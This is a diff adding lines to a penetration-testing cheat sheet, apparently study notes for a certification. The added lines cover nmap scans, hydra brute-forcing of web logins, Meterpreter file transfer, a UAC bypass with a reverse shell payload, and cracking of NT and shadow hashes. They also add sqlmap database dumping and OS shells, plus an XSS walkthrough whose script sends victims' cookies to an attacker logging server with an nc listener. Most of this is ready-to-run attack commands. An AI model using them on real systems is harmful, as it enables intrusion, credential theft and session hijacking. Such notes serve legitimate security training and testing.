@@ -132,8 +132,13 @@ netdiscover -i eth1 -r <TARGET_IP/NETWORK>
 nmap <TARGET_IP>
 ## Skip ping
 nmap -Pn <TARGET_IP>
+## Host discovery + saving into file
+nmap -sn <TARGET_IP>/<SUB> > hosts.txt
+nmap -sn -T4 <TARGET_IP>/<SUB> -oG - | awk '/Up$/{print $2}'
 ## Scan all ports
 nmap -p- <TARGET_IP>
+## Open ports scan + saving into file
+nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open
 ## Port 80 only scan
 nmap -p 80 <TARGET_IP>
 ## Custom list of ports scan
@@ -289,6 +294,8 @@ gzip -d /usr/share/wordlists/rockyou.txt.gz
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
 ```
 
+We can use a wordlist generator tools (how [Cewl](http://127.0.0.1:5000/s/iS3hadq7jVFgSa8k5wRA/tools/cewl)), to create custom wordlists.
+
 #### Metasploit
 
 ```bash
@@ -410,6 +417,11 @@ browsh --startup-url http://<TARGET_IP>
 
 dirb http://<TARGET_IP>
 dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/ #brute http basic auth
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/ #brute http digest
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed" # brute http post form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v" #brute http authenticated post form
 
 wget <TARGET_IP>
 curl <TARGET_IP> | more
@@ -1068,10 +1080,36 @@ set SHA512 true
 
 ## Network Based Attacks
 
+### Wireshark
+
 ```bash
 wireshark -i eth1
 
-# TSHARK
+# Filter by ip
+ip.add == 10.10.10.9
+
+# Filter by dest ip
+ip.dest == 10.10.10.15
+
+# Filter by source ip
+ip.src == 10.10.16.33
+
+# Filter by tcp port
+tcp.port == 25
+
+# Filter by ip addr and port
+ip.addr == 10.10.14.22 and tcp.port == 8080
+
+# Filter SYN flag
+tcp.flags.syn == 1 and tcp.flags.ack ==0
+
+# Broadcast filter
+eth.dst == ff:ff:ff:ff:ff:ff
+```
+
+### TShark
+
+```bash
 tshark -D
 tshark -i eth1
 tshark -r <FILE>.pcap
@@ -1162,14 +1200,18 @@ version
 
 show -h
 show all
-show exploits
+show exploits                     #Aonther way to display exploits
+show payloads                     #display payloads
 
 search <STRING>
 search cve:2017 type:exploit platform:windows
 use <MODULE_NAME>
+show options                      #Check options and required value
+exploit                           #Execution of exploitation
 set <OPTION>
 run
 execute # same as run
+exploit # same as run and execute
 
 sessions
 # Switch between sessions Ids with
@@ -1211,12 +1253,12 @@ exploit
 ```bash
 # meterpreter > <command>
 
-background
+background    #Switch from a Meterpreter session to the msfconsole command line 
 cat
 cd
 checksum md5 /bin/bash
 clearev
-download
+download Filename /root/****   #Download From victm machine to your machine 
 edit
 execute -f ifconfig
 getenv
@@ -1234,9 +1276,9 @@ pwd
 resource <file.txt>
 rmdir
 search -f *.txt
-shell
-sysinfo
-upload
+shell   #run a standard operating system shell 
+sysinfo   #information about the victm Machine 
+upload /****/exploit.exe C://Windows     #Upload from your machine to victm machine   
 ```
 
 ### Info Gathering & Enumeration
@@ -1635,6 +1677,7 @@ run
 ```bash
 # METERPRETER
 run post/windows/manage/migrate
+migrate <pid> #more quickly
 ## Pivoting
 portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
 ```
@@ -1659,6 +1702,22 @@ sessions 3
 
 ### Win Post-Exploitation
 
+#### **To search for files and Folders**
+
+<pre class="language-bash"><code class="lang-bash">dir /b/s "\*.conf\*"
+dir /b/s "\*.txt\*"
+dir /b/s "\*filename\*"
+cd         #it's the same as 'pwd' command in linux
+type       #it's the same as 'cat' command in linux
+systeminfo         #information about the Operating System
+
+# Check Users
+cat /etc/passwd   #Users in linux  
+List drives on the machine
+
+<strong>fsutil fsinfo drives     #Check Drives
+</strong></code></pre>
+
 #### HTTP/HFS
 
 ```bash
@@ -1675,7 +1734,7 @@ migrate
 
 # msfconsole
 use post/windows/manage/migrate
-use post/windows/gather/win_privs
+use post/windows/gather/win_privs #CHECK UAC/Privileges
 use post/windows/gather/enum_logged_on_users
 use post/windows/gather/checkvm
 use post/windows/gather/enum_applications
@@ -1702,7 +1761,7 @@ net localgroup administrators
 # Bypass UAC
 background
 sessions
-use exploit/windows/local/bypassuac_injection
+use exploit/windows/local/bypassuac_injection BYPASS UAC (Background the session first)
 set payload windows/x64/meterpreter/reverse_tcp
 set SESSION 1
 set LPORT <LOCAL_PORT>
@@ -1832,7 +1891,7 @@ shell
 # Local machine Enumeration
 /bin/bash -i
 whoami
-cat /etc/passwd
+cat /etc/passwd #Users and services
 groups root
 cat /etc/*issue
 cat /etc/*release
@@ -1844,6 +1903,8 @@ ss -tnl
 
 ps aux
 env
+
+lsblk -l #Check Drives
 
 # msfconsole
 use post/linux/gather/enum_configs
@@ -2717,12 +2778,16 @@ gzip -d /usr/share/wordlists/rockyou.txt.gz
 john <Hash_Password-File> --wordlist=/usr/share/wordlists/rockyou.txt # To crack the password from your previous output (hashdump,shadow file )
 john --format=NT win_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
+john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
+john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash
+
 #this is another way to crack passwords (that requires shadow file with passwd file)
 unshadow passwd shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 
 hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
 ```
 
 #### Linux
@@ -2734,10 +2799,13 @@ cat /etc/shadow
 use post/linux/gather/hashdump
 
 john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
+john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash
 
 # Hashcat
 hashcat --help | grep 1800
 hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
+ashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
 ```
 
 ### Pivoting
@@ -2856,6 +2924,18 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 40
 
 gobuster dir -u http://<TARGET_IP>/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
 
+# Ffuf
+## Directory discovery:
+ffuf -w wordlist.txt -u http://example.com/FUZZ
+## File discovery:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
+## Output of responses with status code:
+ffuf -w /usr/share/wordlists/dirb/small.txt -u http://example.com/FUZZ -mc 200,301
+## The -maxtime flag offers to end the ongoing fuzzing after the specified time in seconds:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -maxtime 60
+## Number of threads:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
+
 # Nikto
 nikto -h http://<TARGET_IP> -o niktoscan.txt
 
@@ -2882,6 +2962,7 @@ sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"     
 
 ```bash
 sqlmap -r login.req --dbs
+sqlmap -u "http://10.10.10.10/file.php?id=1" --dbs    #determine the databases:
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs #POST Method
 
@@ -2895,7 +2976,8 @@ sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "
 **Get Tables in a Database**
 
 ```bash
-sqlmap -r login.req -D dbname --tables 
+sqlmap -r login.req -D dbname --tables    #determine the tables:
+sqlmap -u "http://10.10.10.10/file.php?id=1" -D dbname --common-tables    #if tables not available, guess tables using common names
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
 ```
@@ -2907,6 +2989,45 @@ sqlmap -r login.req -D dbname -T table_name --dump
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
 ```
+
+#### Get OS-Shell
+
+```bash
+sqlmap -u "http://10.10.10.10/file.php?id=1" --os-shell
+```
+
+### **XSS**
+
+Check an example:
+
+```javascript
+<script>alert("hack :)")</script>
+```
+
+**Hijack cookie through xss**
+
+there are four components as follows:
+
+* attacker client pc
+* attacker logging server
+* vulnerable server
+* victim client pc
+
+1. attacker: first finds a vulnerable server and its breach point.
+2. attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):
+
+```javascript
+<script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>
+```
+
+3. attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the following command:
+
+```
+nc -vv -k -l -p 80
+```
+
+4. attacker: when victim client pc browses the vulnerable server, check the output of the command above.
+5. attacker: after obtaining the victim’s cookie, utilize a firefox’s add-on called Cookie Quick Manager to change to the victim’s cookie in an effort to hijack the victim’s privilege.
 
 **XSSer**
 
